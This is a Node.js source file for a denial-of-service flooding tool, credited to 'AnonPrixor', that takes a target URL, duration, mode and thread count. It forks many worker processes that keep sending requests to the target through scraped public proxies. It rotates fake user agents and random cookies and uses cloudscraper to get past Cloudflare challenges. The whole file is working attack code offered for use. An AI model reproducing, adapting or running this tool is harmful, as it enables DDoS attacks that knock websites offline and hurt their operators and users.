// Import necessary modules
const target = process.argv[2]; // Target URL
const time = process.argv[3]; // Duration of the attack in seconds
const mode = process.argv[4]; // Attack method
const threads = process.argv[5]; // Number of threads
const axios = require("axios"); // HTTP client for fetching proxies
const cluster = require("cluster"); // For managing multiple processes
const fakeua = require("fake-useragent"); // For generating random user agents
const request = require("cloudscraper"); // For bypassing Cloudflare
process.setMaxListeners(15); // Set maximum number of listeners to avoid memory leak warnings

// Check if the correct number of arguments are provided
if (process.argv.length !== 6) {
  console.log(`
        ╦ ╦╔╦╗╔╦╗╔═╗╔═╗   ╔╗╔╔═╗╦═╗╔╦╗╔═╗╦  
        ╠═╣ ║  ║ ╠═╝╚═╗───║║║║ ║╠╦╝║║║╠═╣║  
        ╩ ╩ ╩  ╩ ╩  ╚═╝   ╝╚╝╚═╝╩╚═╩ ╩╩ ╩╩═╝
             Developed By AnonPrixor
    ./socketv8 <URL> <TIME> <HTTP-GET/HTTPS-BYPASS/HTTPS-DROWN/> <THREADS>
    `);
  process.exit(0); // Exit if arguments are not correct
} else {
  main(); // Start the main function
}

async function main() {
  // Print attack details
  console.log(`
               ╔═════════════════════════════════════╗
               ║  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗  ║
               ║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║   ║
               ║  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩   ║
               ╚═════╦═════════════════════════╦═════╝
        ╔════════════╩═════════════════════════╩═══════════╗
                     Developed By AnonPrixor
    `);
  console.log("           Target: ", process.argv[2]);
  console.log("           Time: ", process.argv[3]);
  console.log("           Method: ", process.argv[4]);
  console.log("           Threads: ", process.argv[5]);
  console.log(`
        ╚══════════════════════════════════════════════════╝
    `);

  // Fetch proxies from multiple sources
  const proxyscrape = await axios.get(
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt"
  );
  const proxies = proxyscrape.data.replace(/\r/g, "").split("\n");

  // Generate a random string of specified length
  function makeid(length) {
    var result = "";
    var characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }

  // Send request using proxy
  function send_req_proxy() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    let useragent = fakeua();
    request.get(
      {
        uri: target,
        resolveWithFullResponse: true,
        challengesToSolve: 1,
        proxy: "http://" + proxy,
        headers: {
          Connection: "keep-alive",
          "Cache-Control": "max-age=0",
          "Upgrade-Insecure-Requests": 1,
          "User-Agent": useragent,
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "en-US",
        },
      },
      function (error, response, body) {
        if (response.statusCode == 200) {
          console.log("STATUS CODE | [>> 200 (OK) <<] -> ", process.argv[2]);
        } else if (response.statusCode == 301 || response.statusCode == 302) {
          console.log(
            "STATUS CODE | [>> 301 or 302 (MOVED PERMANENTLY) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 404) {
          console.log(
            "STATUS CODE | [>> 404 (NOT FOUND) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 403) {
          console.log(
            "STATUS CODE | [>> 403 (FORBIDDEN) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 500) {
          console.log(
            "STATUS CODE | [>> 500 (INTERNAL SERVER ERROR) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 502) {
          console.log(
            "STATUS CODE | [>> 502 (BAD GATEWAY) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 503) {
          console.log(
            "STATUS CODE | [>> 503 (SERVICE UNAVAILABLE) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 504) {
          console.log(
            "STATUS CODE | [>> 504 (GATEWAY TIMED OUT) <<] -> ",
            process.argv[2]
          );
        } else {
          console.log("STATUS CODE | [>> WAIT <<] -> ", process.argv[2]);
        }
      }
    );
  }

  // Send GET request using proxy
  function send_get() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    let useragent = fakeua();
    let randomstr = makeid(15);
    request.get(
      {
        uri: target,
        resolveWithFullResponse: true,
        challengesToSolve: 1,
        followRedirects: 1,
        proxy: "http://" + proxy,
        headers: {
          ":method": "GET",
          Connection: "Keep-Alive",
          "Cache-Control": "max-age=0",
          "Upgrade-Insecure-Requests": 1,
          "User-Agent": useragent,
          Accept: "*/*",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "en-PH",
          Cookie: randomstr,
          randomstr,
        },
      },
      function (error, response, body) {
        if (response.statusCode == 200) {
          console.log("STATUS CODE | [>> 200 (OK) <<] -> ", process.argv[2]);
        } else if (response.statusCode == 301 || response.statusCode == 302) {
          console.log(
            "STATUS CODE | [>> 301 or 302 (MOVED PERMANENTLY) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 404) {
          console.log(
            "STATUS CODE | [>> 404 (NOT FOUND) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 403) {
          console.log(
            "STATUS CODE | [>> 403 (FORBIDDEN) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 500) {
          console.log(
            "STATUS CODE | [>> 500 (INTERNAL SERVER ERROR) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 502) {
          console.log(
            "STATUS CODE | [>> 502 (BAD GATEWAY) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 503) {
          console.log(
            "STATUS CODE | [>> 503 (SERVICE UNAVAILABLE) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 504) {
          console.log(
            "STATUS CODE | [>> 504 (GATEWAY TIMED OUT) <<] -> ",
            process.argv[2]
          );
        } else {
          console.log("STATUS CODE | [>> WAIT <<] -> ", process.argv[2]);
        }
      }
    );
  }

  // Send request to bypass user agent mitigations
  function send_req_uam() {
    let useragent = fakeua();
    let randomstr = makeid(15);
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    request.get(
      {
        uri: target + "?v=" + randomstr,
        resolveWithFullResponse: true,
        proxy: "http://" + proxy,
        challengesToSolve: 100,
        headers: {
          Connection: "keep-alive",
          "Cache-Control": "max-age=0",
          "Upgrade-Insecure-Requests": 1,
          "User-Agent": useragent,
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "en-US",
          Cookie: randomstr,
        },
      },
      function (error, response, body) {
        if (response.statusCode == 200) {
          console.log("STATUS CODE | [>> 200 (OK) <<] -> ", process.argv[2]);
        } else if (response.statusCode == 301 || response.statusCode == 302) {
          console.log(
            "STATUS CODE | [>> 301 or 302 (MOVED PERMANENTLY) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 404) {
          console.log(
            "STATUS CODE | [>> 404 (NOT FOUND) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 403) {
          console.log(
            "STATUS CODE | [>> 403 (FORBIDDEN) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 500) {
          console.log(
            "STATUS CODE | [>> 500 (INTERNAL SERVER ERROR) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 502) {
          console.log(
            "STATUS CODE | [>> 502 (BAD GATEWAY) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 503) {
          console.log(
            "STATUS CODE | [>> 503 (SERVICE UNAVAILABLE) <<] -> ",
            process.argv[2]
          );
        } else if (response.statusCode == 504) {
          console.log(
            "STATUS CODE | [>> 504 (GATEWAY TIMED OUT) <<] -> ",
            process.argv[2]
          );
        } else {
          console.log("STATUS CODE | [>> WAIT <<] -> ", process.argv[2]);
        }
      }
    );
  }

  // Function to run the attack
  function run() {
    if (cluster.isMaster) {
      for (let i = 0; i < threads; i++) {
        cluster.fork(); // Create child processes
        console.log(`Creating thread ${i}`);
      }

      // Set timeout to stop the attack
      setTimeout(() => {
        process.exit(0); // Exit after the specified duration
      }, time * 1000);
    } else {
      // Set intervals to send requests based on the mode
      setInterval(() => {
        if (mode == "HTTP-GET") {
          send_get(); // Send GET requests
        } else if (mode == "HTTPS-BYPASS") {
          send_req_uam(); // Bypass user agent mitigations
        } else if (mode == "HTTPS-DROWN") {
          send_req_proxy(); // Send requests using proxies
        } else {
          console.log("Invalid method."); // Invalid mode
          process.exit(0); // Exit if mode is invalid
        }
      });
    }
  }

  // Run the attack
  run();
}

// Handle uncaught exceptions and unhandled promise rejections
process.on("uncaughtException", function (err) {});
process.on("unhandledRejection", function (err) {});
